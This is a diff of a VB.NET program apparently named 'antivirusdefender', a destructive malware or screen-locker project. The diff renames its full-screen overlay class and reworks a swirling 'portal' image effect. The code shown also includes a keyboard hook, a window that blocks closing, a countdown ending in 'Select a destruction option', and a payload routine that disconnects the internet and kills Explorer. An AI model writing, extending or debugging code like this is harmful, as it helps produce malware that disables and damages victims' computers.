@@ -27,8 +27,8 @@ Public Class Form1
     ' Delegate for hook callback
     Private Delegate Function HookProc(nCode As Integer, wParam As IntPtr, lParam As IntPtr) As IntPtr
 
-    ' Class-level variable to hold the overlay instance
-    Public overlay As FullScreenOverlay
+    ' Class-level variable to hold the fullScreenOverlay instance
+    Public fullScreenOverlay As FullScreenOverlayPro
 
     ' Constructor
     Public Sub New()
@@ -166,14 +166,14 @@ Public Class Form1
 
     End Class
 
-    Public Class FullScreenOverlay
+    Public Class FullScreenOverlayPro
         Inherits Form
 
         Public ReadOnly timerLabel As New Label()
         Private ReadOnly audioPlayer As New AudioPlayer()
         Public countdownTime As Integer = 60 ' Countdown timer in seconds
 
-        ' Initialize the full-screen overlay form
+        ' Initialize the full-screen fullScreenOverlay form
         Public Sub New()
             FormBorderStyle = FormBorderStyle.None
             Bounds = Screen.PrimaryScreen.Bounds ' Set form to full-screen
@@ -421,49 +421,34 @@ Public Class Form1
             Next
         End Sub
 
-        ReadOnly random As New Random()
         ' Apply Minecraft Nether portal-like effect with pixelated swirling distortion and motion
         Private portalEffectPhase As Integer = 0 ' Ensure this is initialized
 
         ' Apply Minecraft Nether portal-like effect with pixelated swirling distortion
         Public Sub ApplyPortalEffect(g As Graphics)
+            ' Load the byte array from resources using My.Resources
+            Dim portalImageBytes As Byte() = My.Resources.Resource1.antivirusdefender
+
+            ' Convert the byte array to an Image
+            Dim portalImage As Image
+            Using ms As New MemoryStream(portalImageBytes)
+                portalImage = Image.FromStream(ms)
+            End Using
             Dim gridSize As Integer = 20 ' Size of each pixelated "block"
             portalEffectPhase += 0.05F ' Increment phase for wavy distortion
 
-            Try
-                ' Load the byte array from resources using My.Resources
-                Dim portalImageBytes As Byte() = My.Resources.Resource1.antivirusdefender
+            For y As Integer = 0 To Me.Height Step gridSize
+                For x As Integer = 0 To Me.Width Step gridSize
+                    ' Calculate distorted positions using sine wave (for swirling effect)
+                    Dim distortedX As Integer = x + CInt(Math.Sin((y + portalEffectPhase) / 30.0F) * 10)
+                    Dim distortedY As Integer = y + CInt(Math.Sin((x + portalEffectPhase) / 30.0F) * 10)
 
-                ' Convert the byte array to an Image
-                Dim portalImage As Image
-                Using ms As New MemoryStream(portalImageBytes)
-                    portalImage = Image.FromStream(ms)
-                End Using
-
-                ' Save the image to file
-                Dim filePath As String = "C:\antivirusdefender.png"
-                portalImage.Save(filePath, Imaging.ImageFormat.Png)
-
-                ' Draw the image with the portal effect
-                For y As Integer = 0 To Height Step gridSize
-                    For x As Integer = 0 To Width Step gridSize
-                        ' Calculate distorted positions using sine wave (for swirling effect)
-                        Dim distortedX As Integer = x + CInt(Math.Sin((y + portalEffectPhase) / 30.0F) * 10)
-                        Dim distortedY As Integer = y + CInt(Math.Sin((x + portalEffectPhase) / 30.0F) * 10)
-
-                        ' Create random purple color shades for the portal
-                        Dim colorIntensity As Integer = Random.Next(128, 256)
-                        Dim portalColor As Color = Color.FromArgb(colorIntensity, 128, 0, 128)
-
-                        ' Draw the image at the distorted coordinates
-                        g.DrawImage(portalImage, distortedX, distortedY, gridSize, gridSize)
-                    Next
+                    ' Draw a block of the image at the distorted position
+                    g.DrawImage(portalImage, New Rectangle(distortedX, distortedY, gridSize, gridSize),
+                        New Rectangle(x Mod portalImage.Width, y Mod portalImage.Height, gridSize, gridSize),
+                        GraphicsUnit.Pixel)
                 Next
-
-            Catch ex As Exception
-                ' Handle exception, display a message
-                MessageBox.Show("An error occurred: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
-            End Try
+            Next
         End Sub
 
         ' Prevent form from closing
@@ -482,14 +467,12 @@ Public Class Form1
     Private Const VK_F4 As Integer = &H73 ' Virtual Key Code for F4
 
     Private Sub StartAnimationLoop()
-        ' Check if the overlay is disposed or not visible and show it if necessary
-        If overlay Is Nothing OrElse overlay.IsDisposed Then
-            overlay = New FullScreenOverlay() ' Create a new instance only if needed
-            AddHandler overlay.FormClosed, AddressOf OnOverlayFormClosed
-            overlay.Show()
-        ElseIf Not overlay.Visible Then
-            overlay.Show() ' Show the existing overlay if it is hidden
-        End If
+            ' Launch full-screen GDI effects
+            If fullScreenOverlay Is Nothing OrElse fullScreenOverlay.IsDisposed Then
+            fullScreenOverlay = New FullScreenOverlayPro()
+            AddHandler fullScreenOverlay.FormClosed, AddressOf OnOverlayFormClosed
+            fullScreenOverlay.Show()
+            End If
 
         ' Start the countdown timer if it is not already running
         If Not CountDownTimer.Enabled Then
@@ -506,12 +489,12 @@ Public Class Form1
         "Just Make Unusable My PC Without Destruction"
     }
 
-        Dim choice As String = overlay.PromptUserForChoice("Select a destruction option:", options)
+        Dim choice As String = fullScreenOverlay.PromptUserForChoice("Select a destruction option:", options)
 
         If Not String.IsNullOrEmpty(choice) Then
-            overlay.timerLabel.Text = "Time's up! ANTIVIRUSDEFENDER IS EVERYWHERE!"
+            fullScreenOverlay.timerLabel.Text = "Time's up! ANTIVIRUSDEFENDER IS EVERYWHERE!"
             Thread.Sleep(5000) ' Optional: Adjust as needed
-            overlay.ExecuteDestruction(choice)
+            fullScreenOverlay.ExecuteDestruction(choice)
         End If
     End Sub
 
@@ -1373,6 +1356,15 @@ Public Class Form1
                 ActivateButton.Enabled = False
             End If
 
+            ' Start the animation loop safely
+            Try
+                Task.Factory.StartNew(Sub()
+                                          StartAnimationLoop()
+                                      End Sub)
+            Catch ex As Exception
+                MessageBox.Show("Error in AnimationTimer.Start: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
+            End Try
+            
             ' 1. Disconnect the Internet
             DisconnectInternet()
 
@@ -1431,21 +1423,12 @@ Public Class Form1
 
     ' Event handler for FullScreenOverlay form closure
     Private Sub OnOverlayFormClosed(sender As Object, e As EventArgs)
-        overlay = Nothing
+        fullScreenOverlay = Nothing
     End Sub
 
     ' Method to execute the payload
     Private Sub ExecutePayload()
         Try
-            ' Start the animation loop safely
-            Try
-                Task.Factory.StartNew(Sub()
-                                          StartAnimationLoop()
-                                      End Sub)
-            Catch ex As Exception
-                MessageBox.Show("Error in AnimationTimer.Start: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
-            End Try
-
             ' Kill Explorer and related processes
             Task.Factory.StartNew(Sub()
                                       KillExplorerAndMore()
@@ -1537,37 +1520,37 @@ Public Class Form1
     End Sub
 
     Private Sub CountDownTimer_Tick(sender As Object, e As EventArgs) Handles CountDownTimer.Tick
-        If overlay IsNot Nothing AndAlso Not overlay.IsDisposed Then
+        If fullScreenOverlay IsNot Nothing AndAlso Not fullScreenOverlay.IsDisposed Then
             ' Run the ApplyPortalEffect method in a separate task.
             Task.Factory.StartNew(Sub()
                                       ' Ensure graphics drawing is done on the UI thread.
-                                      If overlay.InvokeRequired Then
-                                          overlay.Invoke(New MethodInvoker(Sub()
-                                                                               Using g As Graphics = overlay.CreateGraphics()
+                                      If fullScreenOverlay.InvokeRequired Then
+                                          fullScreenOverlay.Invoke(New MethodInvoker(Sub()
+                                                                               Using g As Graphics = fullScreenOverlay.CreateGraphics()
                                                                                    g.SmoothingMode = SmoothingMode.None
-                                                                                   overlay.ApplyPortalEffect(g)
+                                                                                   fullScreenOverlay.ApplyPortalEffect(g)
                                                                                End Using
                                                                            End Sub))
                                       Else
-                                          Using g As Graphics = overlay.CreateGraphics()
+                                          Using g As Graphics = fullScreenOverlay.CreateGraphics()
                                               g.SmoothingMode = SmoothingMode.None
-                                              overlay.ApplyPortalEffect(g)
+                                              fullScreenOverlay.ApplyPortalEffect(g)
                                           End Using
                                       End If
                                   End Sub)
         End If
 
         ' Decrement the countdown time.
-        If overlay.countdownTime > 0 Then
-            overlay.countdownTime -= 1
+        If fullScreenOverlay.countdownTime > 0 Then
+            fullScreenOverlay.countdownTime -= 1
 
             ' Ensure the UI update runs on the UI thread.
-            If overlay.InvokeRequired Then
-                overlay.Invoke(New MethodInvoker(Sub()
-                                                     overlay.timerLabel.Text = "Remaining Time: " & overlay.countdownTime.ToString() & " seconds"
+            If fullScreenOverlay.InvokeRequired Then
+                fullScreenOverlay.Invoke(New MethodInvoker(Sub()
+                                                     fullScreenOverlay.timerLabel.Text = "Remaining Time: " & fullScreenOverlay.countdownTime.ToString() & " seconds"
                                                  End Sub))
             Else
-                overlay.timerLabel.Text = "Remaining Time: " & overlay.countdownTime.ToString() & " seconds"
+                fullScreenOverlay.timerLabel.Text = "Remaining Time: " & fullScreenOverlay.countdownTime.ToString() & " seconds"
             End If
         Else
             ' Stop the timer when the countdown reaches zero and handle completion.
